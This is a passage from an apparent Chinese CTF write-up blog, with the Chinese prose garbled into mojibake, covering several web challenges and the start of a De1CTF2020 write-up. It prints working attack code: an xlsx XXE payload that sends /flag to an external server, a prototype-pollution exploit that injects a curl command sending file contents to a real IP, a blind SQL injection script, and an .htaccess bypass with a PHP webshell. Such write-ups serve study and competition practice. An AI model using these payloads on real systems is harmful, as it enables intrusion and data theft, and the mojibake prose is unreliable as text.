&lt;/welcome-file-list&gt; &lt;servlet&gt; &lt;description&gt;&lt;/description&gt; &lt;display-name&gt;UploadServlet&lt;/display-name&gt; &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;servlet&gt; &lt;description&gt;&lt;/description&gt; &lt;display-name&gt;ListFileServlet&lt;/display-name&gt; &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/ListFileServlet&lt;/url-pattern&gt; &lt;/servlet-mapping&gt; &lt;servlet&gt; &lt;description&gt;&lt;/description&gt; &lt;display-name&gt;DownloadServlet&lt;/display-name&gt; &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt; &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;&lt;/web-app&gt; ä¸‰ä¸ªServlet,è·¯å¾„ä¹Ÿéƒ½ç»™å‡ºæ¥äº†ï¼Œä¸€ä¸ªä¸ªè¯»ç„¶ååç¼–è¯‘å§ã€‚ è¿™é‡Œç›´æ¥ç»™å‡ºå«æœ‰å…³é”®ä»£ç çš„javaUploadServlet.java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.// Jad home page: http://www.geocities.com/kpdus/jad.html// Decompiler options: packimports(3) // Source File Name: UploadServlet.javapackage cn.abc.servlet;import java.io.*;import java.util.*;import javax.servlet.*;import javax.servlet.http.*;import org.apache.commons.fileupload.FileItem;import org.apache.commons.fileupload.FileUploadException;import org.apache.commons.fileupload.disk.DiskFileItemFactory;import org.apache.commons.fileupload.servlet.ServletFileUpload;import org.apache.poi.openxml4j.exceptions.InvalidFormatException;import org.apache.poi.ss.usermodel.*;public class UploadServlet extends HttpServlet&#123; public UploadServlet() &#123; &#125; protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doPost(request, response); &#125; protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; String savePath; File tempFile; String message; savePath = getServletContext().getRealPath(\"/WEB-INF/upload\"); String tempPath = getServletContext().getRealPath(\"/WEB-INF/temp\"); tempFile = new File(tempPath); if(!tempFile.exists()) tempFile.mkdir(); message = \"\"; ServletFileUpload upload; DiskFileItemFactory factory = new DiskFileItemFactory(); factory.setSizeThreshold(0x19000); factory.setRepository(tempFile); upload = new ServletFileUpload(factory); upload.setProgressListener(new Object() /* anonymous class not found */ class _anm1 &#123;&#125;); upload.setHeaderEncoding(\"UTF-8\"); upload.setFileSizeMax(0x100000L); upload.setSizeMax(0xa00000L); if(!ServletFileUpload.isMultipartContent(request)) return; try &#123; List list = upload.parseRequest(request); Iterator iterator = list.iterator(); do &#123; if(!iterator.hasNext()) break; FileItem fileItem = (FileItem)iterator.next(); if(fileItem.isFormField()) &#123; String name = fileItem.getFieldName(); String s = fileItem.getString(\"UTF-8\"); &#125; else &#123; String filename = fileItem.getName(); if(filename != null &amp;&amp; !filename.trim().equals(\"\")) &#123; String fileExtName = filename.substring(filename.lastIndexOf(\".\") + 1); InputStream in = fileItem.getInputStream(); if(filename.startsWith(\"excel-\") &amp;&amp; \"xlsx\".equals(fileExtName)) try &#123; Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); &#125; catch(InvalidFormatException e) &#123; System.err.println(\"poi-ooxml-3.10 has something wrong\"); e.printStackTrace(); &#125; String saveFilename = makeFileName(filename); request.setAttribute(\"saveFilename\", saveFilename); request.setAttribute(\"filename\", filename); String realSavePath = makePath(saveFilename, savePath); FileOutputStream out = new FileOutputStream((new StringBuilder()).append(realSavePath).append(\"/\").append(saveFilename).toString()); byte buffer[] = new byte[1024]; for(int len = 0; (len = in.read(buffer)) &gt; 0;) out.write(buffer, 0, len); in.close(); out.close(); message = \"\\u6587\\u4EF6\\u4E0A\\u4F20\\u6210\\u529F!\"; &#125; &#125; &#125; while(true); &#125; catch(FileUploadException e) &#123; e.printStackTrace(); &#125; request.setAttribute(\"message\", message); request.getRequestDispatcher(\"/ListFileServlet\").forward(request, response); return; &#125; private String makeFileName(String filename) &#123; return (new StringBuilder()).append(UUID.randomUUID().toString()).append(\"_\").append(filename).toString(); &#125; private String makePath(String filename, String savePath) &#123; int hashCode = filename.hashCode(); int dir1 = hashCode &amp; 0xf; int dir2 = (hashCode &amp; 0xf0) &gt;&gt; 4; String dir = (new StringBuilder()).append(savePath).append(\"/\").append(dir1).append(\"/\").append(dir2).toString(); File file = new File(dir); if(!file.exists()) file.mkdirs(); return dir; &#125; private static final long serialVersionUID = 1L;&#125; å®è¯è¯´,ç¬¬ä¸€æ­¥è¯»å®Œåçœ‹äº†çœ¼æ‰€æœ‰çš„æºç ã€‚æ²¡çœ‹å‡ºä»€ä¹ˆç«¯å€ªã€‚(å…¶å®æ˜¯çœ‹æ¼äº†)ç¬¬ä¸€æƒ³æ³•æ˜¯å¹½çµçŒ«ã€‚ä½†æ˜¯é—®äº†ä¸‹é˜Ÿå‹è¯´8009ç«¯å£ä¸æ˜¯å¼€çš„å°±ä½œç½¢ã€‚ç„¶åæƒ³åˆ©ç”¨åˆšåˆšçš„ä»»æ„æ–‡ä»¶ä¸‹è½½è¯»flag.å´å‘ç°è¢«å®šä½åˆ°404äº†ã€‚ä»”ç»†çœ‹æºç ä¼šå‘ç°DownloadServlet.java 123456if(fileName != null &amp;&amp; fileName.toLowerCase().contains(\"flag\")) &#123; request.setAttribute(\"message\", \"\\u7981\\u6B62\\u8BFB\\u53D6\"); request.getRequestDispatcher(\"/message.jsp\").forward(request, response); return; &#125; æœç„¶è¿‡æ»¤äº†å…³é”®å­—ã€‚éœ€è¦å…¶ä»–æ–¹æ³•è¯»flag. æ­¤æ—¶å›è¿‡å¤´å‘ç°uploadservletæœ‰ä¸€æ®µçªå…€çš„æºç  123456789101112if(filename.startsWith(\"excel-\") &amp;&amp; \"xlsx\".equals(fileExtName)) try &#123; Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); &#125; catch(InvalidFormatException e) &#123; System.err.println(\"poi-ooxml-3.10 has something wrong\"); e.printStackTrace(); &#125; æˆ‘ç¬¬ä¸€æƒ³æ³•æ˜¯æƒ³åˆ°ä¹‹å‰æ›¾ç»çœ‹è¿‡ä½†æ²¡åšè¿‡çš„swpuctf web5.é‚£é“é¢˜æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è§è¿‡èƒ½ç”¨xlsxæ‰“xxeçš„ç±»å‹ã€‚è€Œå®ƒç”¨åˆ°çš„å°±æ˜¯ä¸€ä¸ªå¾ˆè€çš„cve,CVE-2014-3529. è€Œè¿™éƒ¨åˆ†ä»£ç é€»è¾‘è¡¨ç¤ºï¼Œå¦‚æœæˆ‘ä»¬çš„æ–‡ä»¶åæ˜¯excel-å¼€å§‹åŠ ä¸Š.xlsxç»“å°¾ï¼Œå°±ä¼šç”¨poiè§£æxlsxã€‚è€Œè¿™ä¸ªCVEçš„poiç‰ˆæœ¬æ°å¥½æ˜¯poi-ooxml-3.10 é‚£å°±ä¸ç”¨è¯´äº†,å…ˆè¯•ç€æŒ‰æµç¨‹æ„é€ ä¸‹payloadã€‚æ³¨æ„,è¿™é‡Œæ„é€ payloadæ—¶æœ€å¥½åœ¨zipä¸­æ‰“å¼€æˆ‘ä»¬éœ€è¦ä¿®æ”¹çš„[Content-Types].xmlã€‚å¦åˆ™å¯èƒ½ä¼šå‡ºé”™ã€‚è¿™æ˜¯æˆ‘å¬åŒå­¦è¯´æ‰çŸ¥é“æœ‰è¿™ç§ç„å­¦é—®é¢˜ã€‚æˆ‘ä¸ªäººæ˜¯å…ˆå°†xlsxæ”¹ä¸ºzip,ç„¶åwinrarç›´æ¥æ‰“å¼€ä¿®æ”¹xmlçš„pocã€‚æœ€åå†æ”¹å›æ¥ã€‚è¿™æ ·åº”è¯¥å°±æ²¡å•¥é—®é¢˜äº†ã€‚ å‘ç°vpsèƒ½æ”¶åˆ°è¯·æ±‚ã€‚é‚£å°±ç›´æ¥xxeç›²æ‰“ä¸€æŠŠæ¢­äº†ã€‚poc 123456&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM \"http://xxxxxx/1.xml\"&gt;%int;%all;%send;]&gt; vpsä¸Šçš„1.xml 12&lt;!ENTITY % payl SYSTEM \"file:///flag\"&gt;&lt;!ENTITY % all \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://xxxxxxxx/?%payl;'&gt;\"&gt; ç›‘å¬80ç«¯å£æ”¶åˆ°flag notesæºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143var express = require('express');var path = require('path');const undefsafe = require('undefsafe');const &#123; exec &#125; = require('child_process');var app = express();class Notes &#123; constructor() &#123; this.owner = \"whoknows\"; this.num = 0; this.note_list = &#123;&#125;; &#125; write_note(author, raw_note) &#123; this.note_list[(this.num++).toString()] = &#123;\"author\": author,\"raw_note\":raw_note&#125;; &#125; get_note(id) &#123; var r = &#123;&#125; undefsafe(r, id, undefsafe(this.note_list, id)); return r; &#125; edit_note(id, author, raw) &#123; undefsafe(this.note_list, id + '.author', author); undefsafe(this.note_list, id + '.raw_note', raw); &#125; get_all_notes() &#123; return this.note_list; &#125; remove_note(id) &#123; delete this.note_list[id]; &#125;&#125;var notes = new Notes();notes.write_note(\"nobody\", \"this is nobody's first note\");app.set('views', path.join(__dirname, 'views'));app.set('view engine', 'pug');app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(express.static(path.join(__dirname, 'public')));app.get('/', function(req, res, next) &#123; res.render('index', &#123; title: 'Notebook' &#125;);&#125;);app.route('/add_note') .get(function(req, res) &#123; res.render('mess', &#123;message: 'please use POST to add a note'&#125;); &#125;) .post(function(req, res) &#123; let author = req.body.author; let raw = req.body.raw; if (author &amp;&amp; raw) &#123; notes.write_note(author, raw); res.render('mess', &#123;message: \"add note sucess\"&#125;); &#125; else &#123; res.render('mess', &#123;message: \"did not add note\"&#125;); &#125; &#125;)app.route('/edit_note') .get(function(req, res) &#123; res.render('mess', &#123;message: \"please use POST to edit a note\"&#125;); &#125;) .post(function(req, res) &#123; let id = req.body.id; let author = req.body.author; let enote = req.body.raw; if (id &amp;&amp; author &amp;&amp; enote) &#123; notes.edit_note(id, author, enote); res.render('mess', &#123;message: \"edit note sucess\"&#125;); &#125; else &#123; res.render('mess', &#123;message: \"edit note failed\"&#125;); &#125; &#125;)app.route('/delete_note') .get(function(req, res) &#123; res.render('mess', &#123;message: \"please use POST to delete a note\"&#125;); &#125;) .post(function(req, res) &#123; let id = req.body.id; if (id) &#123; notes.remove_note(id); res.render('mess', &#123;message: \"delete done\"&#125;); &#125; else &#123; res.render('mess', &#123;message: \"delete failed\"&#125;); &#125; &#125;)app.route('/notes') .get(function(req, res) &#123; let q = req.query.q; let a_note; if (typeof(q) === \"undefined\") &#123; a_note = notes.get_all_notes(); &#125; else &#123; a_note = notes.get_note(q); &#125; res.render('note', &#123;list: a_note&#125;); &#125;)app.route('/status') .get(function(req, res) &#123; let commands = &#123; \"script-1\": \"uptime\", \"script-2\": \"free -m\" &#125;; for (let index in commands) &#123; exec(commands[index], &#123;shell:'/bin/bash'&#125;, (err, stdout, stderr) =&gt; &#123; if (err) &#123; return; &#125; console.log(`stdout: $&#123;stdout&#125;`); &#125;); &#125; res.send('OK'); res.end(); &#125;)app.use(function(req, res, next) &#123; res.status(404).send('Sorry cant find that!');&#125;);app.use(function(err, req, res, next) &#123; console.error(err.stack); res.status(500).send('Something broke!');&#125;);const port = 8080;app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:$&#123;port&#125;`)) è€å®è¯´ä¸€å¼€å§‹å®¡å®Œæºç æ²¡å•¥æ”¶è·ã€‚å¤§æ¦‚çš„æ€è·¯æ˜¯,é¢˜ç›®å·²ç»æœ‰äº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œã€‚é‚£ä¹ˆæˆ‘è¦æ˜¯èƒ½ä¿®æ”¹å®ƒå›ºå®šæ­»çš„å‘½ä»¤å†…å®¹å°±èƒ½ä»»æ„æ‰“äº†ã€‚ä½†æ˜¯è¿™ç§è¾¾æˆè‚¯å®šæ˜¯è¦åŸå‹é“¾æ±¡æŸ“çš„ã€‚æˆ‘æ²¡çœ‹åˆ°merge()ä¹‹ç±»çš„å‡½æ•°å°±æ²¡ç»§ç»­æƒ³äº† ç„¶åä¹‹åå‘ç°è¿™é¢˜å±…ç„¶æœ‰åŸé¢˜å‚è€ƒçš„â€¦https://github.com/balsn/ctf_writeup/blob/master/20181124-asisctffinal/README.md#secure-apiä»”ç»†çœ‹äº†ä¸‹å‘ç°å¥½åƒå‡ ä¹ä¸€æ ·å•Šã€‚åªæœ‰ä¸€ä¸ªundefsafeä¾èµ–çš„åŒºåˆ«.ç„¶åå°±å‘ç°è¿™ä¸ªä¾èµ–æœç„¶å­˜åœ¨åŸå‹é“¾æ±¡æŸ“çš„é—®é¢˜ Prototype Pollution 1234var a = require(\"undefsafe\");var payload = \"__proto__.toString\";a(&#123;&#125;,payload,\"JHU\");console.log(&#123;&#125;.toString); å‚ç…§è¿™ä¸ªä¾‹å­,æˆ‘ä»¬å¾ˆå¿«å°±èƒ½æ‰¾åˆ°åŸå‹é“¾çš„æ±¡æŸ“ç‚¹åœ¨edit_noteè¿™ã€‚ 1234edit_note(id, author, raw) &#123; undefsafe(this.note_list, id + '.author', author); undefsafe(this.note_list, id + '.raw_note', raw); &#125; ç„¶åæŒ‰wpçš„payloadæ”¹å°±è¡Œäº† 123456789import requestss = requests.session()data=&#123;'raw':'curl 120.27.246.202/?`cat /flag`','id':'__proto__','author':'byc_404'&#125;url='http://bed4f32827b843ca9ad5b763749970dd265f40236d544ada.cloudgame1.ichunqiu.com:8080/'r=s.post(url+'edit_note',json=data)print(r.text)r=s.get(url+\"status\")print(r.text) è¿™é‡Œidæ±¡æŸ“äº†åç”¨rawæˆ–è€…authorä¸¤ä¸ªå±æ€§éƒ½èƒ½å‘½ä»¤æ‰§è¡Œã€‚å½“ç„¶å› ä¸ºå›æ˜¾çš„åŸå› æˆ‘ä»¬é€‰æ‹©curlå¤–å¸¦æ•°æ® traceè¿™é¢˜æ²¡åšå‡ºæ¥ç¡®å®ä¸å¤ªåº”è¯¥ã€‚èµ›åæŒ‰éƒå¸ˆå‚…çš„æ€è·¯æœç„¶ä¸€ä¸‹å°±å‡ºäº†ã€‚ä¸è¿‡ä¹Ÿè¯æ˜sqlé‡Œçš„æŠ€å·§ç¡®å®ä¸å°‘å•Šã€‚ é¦–å…ˆå½“ç„¶æ˜¯sqlç±»å‹.é¢˜ç›®åªæœ‰ä¸€ä¸ªregister_do.php,è€Œæ²¡æœ‰loginçš„åŠŸèƒ½ã€‚æµ‹äº†ä¸€ä¼šåçªç„¶å‘ç°ï¼Œå›æ˜¾å˜æˆäº†WTF???row&gt;20è€Œä¸”ä½ çš„payloadæ€ä¹ˆæ”¹å›æ˜¾éƒ½ä¸€è‡´.é‚£ä¹ˆæ­¤æ—¶å¯ä»¥å¤§è‡´æ¨æ–­ä¸‹ã€‚æˆ‘ä»¬çš„payloadæ˜¯è¢«æ‹¼æ¥è¿›äº†insert intoè¯­å¥ã€‚å› æ­¤æ•°æ®åº“çš„è¿”å›ç»“æœæ‰ä¼šå¢å¤šåˆ°ä¸Šé™20ã€‚ é‚£ä¹ˆé¦–å…ˆçŒœæµ‹ç»“æ„ï¼Œæ„é€ payloadusername=admin&#39;,if(1=1,sleep(5),1))#ä¼šå‘ç°è™½ç„¶è¿”å›äº†504ã€‚ä½†æ˜¯çš„ç¡®å¯ä»¥å»¶æ—¶.ç„¶è€Œå†æŒ‰ç…§è¿™ä¸ªæ€è·¯æ„é€ ç›²æ³¨payloadå´å‘ç°æˆ‘ä»¬å¹¶ä¸èƒ½è·‘å‡ºä»€ä¹ˆç»“æœã€‚æ­¤æ—¶å†è®¿é—®register_do.phpå‘ç°rowåˆè¶…å‡º20äº†. æ‰€ä»¥å…³é”®å°±æ˜¯ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•ä¸å¢åŠ ç»“æœ,åŒæ—¶è¿˜èƒ½å»¶æ—¶ã€‚ è¿™é‡Œå°±å¾—è†œä¸€æ³¢éƒå¸ˆå‚…äº†ã€‚10åˆ†é’Ÿä¸åˆ°å°±èƒ½å‡ºç»“æœâ€¦payload: 11&#39;^if(ascii(substr((select &#96;2&#96; from (select 1,2 union select * from flag)a limit 1,1),1,1))&#x3D;102,pow(9999,100) or sleep(3),pow(9999,100)),&#39;1&#39;)# æ—¢ç„¶æ²¡æœ‰ä»€ä¹ˆwafã€‚æˆ‘ä»¬å°±æŠŠä¸»ä½“éƒ¨åˆ†å¸¦ä¸Šifå­—å¥è¿›è¡Œæ—¶é—´ç›²æ³¨çš„åˆ¤æ–­ã€‚ä½†æ˜¯æ­¤æ—¶æˆ‘ä»¬è®©ç»“æœåŒæ—¶pow(9999,100)ä¹Ÿå°±æ˜¯æŠ¥é”™ä¸€ä¸‹ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±ä¸ç”¨æ‹…å¿ƒè¯­å¥æ•°è¶…è¿‡20çš„ä¸Šé™ã€‚ ç„¶åå‘ç°è¡¨åä¸çŸ¥é“ä¸ºä»€ä¹ˆè·‘ä¸å‡ºæ¥ã€‚ä½†æ˜¯å¯ä»¥ç›´æ¥å°è¯•flagè¡¨ç„¶åæ— åˆ—åæ³¨å…¥ã€‚ 1select &#96;2&#96; from (select 1,2 union select * from flag)a limit 1,1 exp 1234567891011121314151617181920212223import requestsflag=\"\"for i in range(1,50): print(i) a=0 for j in \"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-\": url = 'http://1ff59e94406f4210a83ac8268a0037c3334b9006071c441b.changame.ichunqiu.com/register_do.php' payload = \"1'^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),\"+str(i)+\",1))=\" + str(ord(j)) + \",pow(99999,100) or sleep(3),pow(99999,100)),'1')#\" data = &#123; 'username': payload, 'password': '321' &#125; r = requests.post(url, data=data) try: r = requests.post(url, data=data, timeout=3.0) except requests.exceptions.ReadTimeout: flag+=j print(flag) a=1 break if a==0: break è€å®è¯´æœ€ååå‡ åˆ†é’Ÿå¯èƒ½ä¸å¤Ÿåšå‡ºæ¥çš„å§ã€‚ä½†å¦‚æœæ›´æ—©ç‚¹æ•é”çš„å¯Ÿè§‰åˆ°è¿™ç§æ³¨å…¥å¹¶æ‰¾åˆ°æ‰‹æ®µå°±å¥½äº†â€¦ä½†æ˜¯è¿™é¢˜æ”¶è·è¿˜æ˜¯ä¸å°‘çš„ã€‚æ¯•ç«Ÿè‡ªå·±å¥½ä¹…æ²¡è§åˆ°insert_intoçš„ç›²æ³¨ã€‚æ‰‹æ³•ä¹Ÿç”Ÿç–äº†ä¸å°‘ã€‚sqlæ³¨å…¥çš„æŠ€å·§å­¦ä¹ è¿˜è¦ç»§ç»­åŠ æŠŠåŠ²å•Šã€‚ å°ç»“ç½‘é¼ç»“æŸåè¿™ä¸ªæœˆè¿˜æœ‰ä¸å°‘å…¶ä»–æ¯”èµ›ã€‚ä¸è¿‡ä¼°è®¡æ²¡å¤šå°‘æ—¶é—´èŠ±åœ¨CTFä¸Šäº†ã€‚è¿™ä¸ªæœˆä¸€æ–¹é¢å¸Œæœ›æŠŠjava,æ¸—é€ç­‰æ–¹é¢çš„çŸ¥è¯†å†æ¥è§¦ä¸‹ã€‚ç„¶åæ¯”èµ›æ‰“å¥½ã€‚ç­‰ä¸‹ä¸ªæœˆå·®ä¸å¤šå°±è¦ä¸“æ³¨åœ¨å­¦ä¸šä¸Šäº†ã€‚","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"De1CTF2020","slug":"De1CTF2020writeup","date":"2020-05-04T12:21:53.000Z","updated":"2021-02-18T05:08:58.948Z","comments":true,"path":"2020/05/04/De1CTF2020writeup/","link":"","permalink":"https://www.bycsec.top/2020/05/04/De1CTF2020writeup/","excerpt":"ç»ˆäºåˆ°ç¬¬äºŒæ¬¡XCTFäº†ã€‚æ²¡æƒ³åˆ°De1taçš„é¢˜è¿™æ¬¡è¿™ä¹ˆé¡¶ï¼Œæœç„¶æ˜¯å‡ºç»™å›½é™…é˜Ÿä¼çš„éš¾åº¦ã€‚(è†œä¸€æ³¢å›½å†…å¤–å¤§ä½¬é˜Ÿä¼)å°ç»¿è‰è¿™æ¬¡ä¹Ÿå°±æˆ‘ä»¬å¤§äºŒçš„å‡ ä¸ªåœ¨æ‰“ï¼Œå¤§å®¶åŸºæœ¬éƒ½è‡ªé—­äº†ã€‚WEBè‡ªå·±ä¹Ÿåªåšå‡ºä¸¤é“é¢˜ï¼Œè¯´å®è¯è¦æ˜¯è‡ªå·±JAVAçš„å­¦ä¹ è®¡åˆ’å†æå‰ä¸€ç‚¹çš„è¯è¯´ä¸å®šèƒ½æŠŠcalcé‚£é¢˜å‡ºäº†çš„â€¦è¿™æ ·ä¹Ÿä¸è‡³äºè¢«å¡åœ¨20åå¼€å¤–ã€‚ ç­‰wpå‡ºæ¥è‡ªå·±äº‰å–æŠŠèƒ½åšçš„é¢˜éƒ½å¤ç°äº†ã€‚","text":"ç»ˆäºåˆ°ç¬¬äºŒæ¬¡XCTFäº†ã€‚æ²¡æƒ³åˆ°De1taçš„é¢˜è¿™æ¬¡è¿™ä¹ˆé¡¶ï¼Œæœç„¶æ˜¯å‡ºç»™å›½é™…é˜Ÿä¼çš„éš¾åº¦ã€‚(è†œä¸€æ³¢å›½å†…å¤–å¤§ä½¬é˜Ÿä¼)å°ç»¿è‰è¿™æ¬¡ä¹Ÿå°±æˆ‘ä»¬å¤§äºŒçš„å‡ ä¸ªåœ¨æ‰“ï¼Œå¤§å®¶åŸºæœ¬éƒ½è‡ªé—­äº†ã€‚WEBè‡ªå·±ä¹Ÿåªåšå‡ºä¸¤é“é¢˜ï¼Œè¯´å®è¯è¦æ˜¯è‡ªå·±JAVAçš„å­¦ä¹ è®¡åˆ’å†æå‰ä¸€ç‚¹çš„è¯è¯´ä¸å®šèƒ½æŠŠcalcé‚£é¢˜å‡ºäº†çš„â€¦è¿™æ ·ä¹Ÿä¸è‡³äºè¢«å¡åœ¨20åå¼€å¤–ã€‚ ç­‰wpå‡ºæ¥è‡ªå·±äº‰å–æŠŠèƒ½åšçš„é¢˜éƒ½å¤ç°äº†ã€‚ checkinè¿™é¢˜è¿˜ç®—æ¯”è¾ƒç®€å•.å°±æ˜¯è‡ªå·±ä¸€å¼€å§‹æ‰‹è´±é€‰çš„mixtureå»åšæµªè´¹äº†ä¸å°‘æ—¶é—´ é¦–å…ˆç®€å•ä¸Šä¼ FUZZä¸‹ï¼Œä¼šå‘ç°é™åˆ¶äº†filenameï¼Œfiletypeä»¥åŠfileçš„å†…å®¹å…¶ä»–çš„éƒ½è¿˜å¥½ã€‚ä¸è¿‡å†…å®¹é»‘åå•é‡Œperl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contentsä¸»è¦æ˜¯ä¸€ä¸ªphçš„é—®é¢˜ã€‚å¯¹webshellè€Œè¨€,åº”è¯¥åªèƒ½ä½¿ç”¨ä¸é—­åˆçš„çŸ­æ ‡ç­¾äº† ä½†æ˜¯å› ä¸ºæ–‡ä»¶åç¼€ä¸¥æ ¼é™åˆ¶ï¼Œæ‰€ä»¥åªèƒ½æŒ‰ç…§è¦æ±‚ä¸Šä¼ å›¾ç‰‡é©¬ã€‚ç°åœ¨éœ€è¦.htaccessæ¥æ§åˆ¶è§£æå®ƒã€‚å¹¸è¿çš„æ˜¯ï¼Œ.htaccesså¹¶æ²¡æœ‰è¢«é™åˆ¶ä¸è¿‡æ³¨æ„ã€‚.htaccessä¸­å¸¸è§çš„å‡ ç§æŠŠ.jpgè§£ææˆphpçš„å†™æ³•ä¸­ï¼Œphpæ˜¯å¿…ä¸å¯å°‘çš„.é‚£å°±å¾—ç»•è¿‡é™åˆ¶ä¸Šä¼  è¿™é‡Œå°±æœ‰ä¸¤ç§æ€è·¯äº†ï¼Œä¸€ç§æ˜¯ä¸Šä¼ cgiè¿›è¡Œgetshell,å½“æ—¶ç®€å•æœäº†ä¸‹å‘ç°ç¡®å®å¹¶ä¸éœ€è¦phpå‡ºç° ä½†æ˜¯æ›´ç®€å•çš„æ˜¯æ¥è‡ªXNUCAçš„éé¢„æœŸè§£ã€‚ä½¿ç”¨\\ç›´æ¥ç»•è¿‡wafã€‚å³ä½¿æ˜¯.htaccessè¿™ç§è¯´æ³•ä¸Šä¸å…è®¸æ¢è¡Œçš„æ–‡ä»¶ï¼Œå®ƒä¹Ÿæ˜¯æ”¯æŒ\\ç›´æ¥æ¢è¡Œçš„ï¼Œå› æ­¤è½»æ¾bypass 12addtype application&#x2F;x-httpd-p\\hp .jpg 1&lt;?=system('cat /flag'); Hard_Pentest_1åšå®Œè¿™é¢˜çœŸçš„æ˜¯å¾—åº†å¹¸è‡ªå·±å½“åˆhtbåšäº†å°windowsçš„é¶æœºã€‚ä¸ç„¶è¿åšä¸‹å»çš„å‹‡æ°”éƒ½æ²¡æœ‰ æ¯”èµ›æ—¶æ²¡å’‹æˆªå›¾,å°†å°±ä¸‹çœ‹å§é¦–å…ˆç¬¬ä¸€æ­¥æ˜¯ç»™å‡ºçš„ä¸Šä¼ æºç  12345678910111213141516171819202122232425262728293031323334353637&lt;?php//Clear the uploads directory every hourhighlight_file(__FILE__);$sandbox = \"uploads/\". md5(\"De1CTF2020\".$_SERVER['REMOTE_ADDR']);@mkdir($sandbox);@chdir($sandbox);if($_POST[\"submit\"])&#123; if (($_FILES[\"file\"][\"size\"] &lt; 2048) &amp;&amp; Check())&#123; if ($_FILES[\"file\"][\"error\"] &gt; 0)&#123; die($_FILES[\"file\"][\"error\"]); &#125; else&#123; $filename=md5($_SERVER['REMOTE_ADDR']).\"_\".$_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $filename); echo \"save in:\" . $sandbox.\"/\" . $filename; &#125; &#125; else&#123; echo \"Not Allow!\"; &#125;&#125;function Check()&#123; $BlackExts = array(\"php\"); $ext = explode(\".\", $_FILES[\"file\"][\"name\"]); $exts = trim(end($ext)); $file_content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]); if(!preg_match('/[a-z0-9;~^`&amp;|]/is',$file_content) &amp;&amp; !in_array($exts, $BlackExts) &amp;&amp; !preg_match('/\\.\\./',$_FILES[\"file\"][\"name\"])) &#123; return true; &#125; return false;&#125;?&gt; webshellçš„é™åˆ¶,ä¸»è¦æ˜¯æ–‡ä»¶åç¼€è·Ÿå†…å®¹ã€‚è‡ªå·±ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯æ­£åˆ™å›æº¯ç»•ä¸‹!preg_match()ä½†æ˜¯å¾ˆå¿«å°±å‘ç°æ–‡ä»¶å¤ªå¤§ä¼ ä¸ä¸Šå»ã€‚è€Œä¸”webshellè¿åˆ†å·éƒ½æ²¡äº†,ä¸å¥½æ„é€ ã€‚ç»é˜Ÿå‹æé†’æ˜¯å°windowsé¶æœº,å¯ä»¥åˆ©ç”¨windwosä¸åŒºåˆ†å¤§å°å†™çš„ç‰¹æ€§ä¸Šä¼ ã€‚åŒæ—¶å†…å®¹å¯ä»¥å‚è€ƒXCTFFINALlfi,ç”¨å…¨çŸ­æ ‡ç­¾æ„é€ æ— å­—æ¯æ•°å­—webshellå¤§æ¦‚æ˜¯ä¸‹é¢è¿™æ ·çš„å§,å½“æ—¶è‡ªå·±å†™çš„ç”¨ä¸å‡ºæ¥ï¼Œå€Ÿäº†éƒå¸ˆå‚…çš„ç›´æ¥ä¸Šè½¦ã€‚ 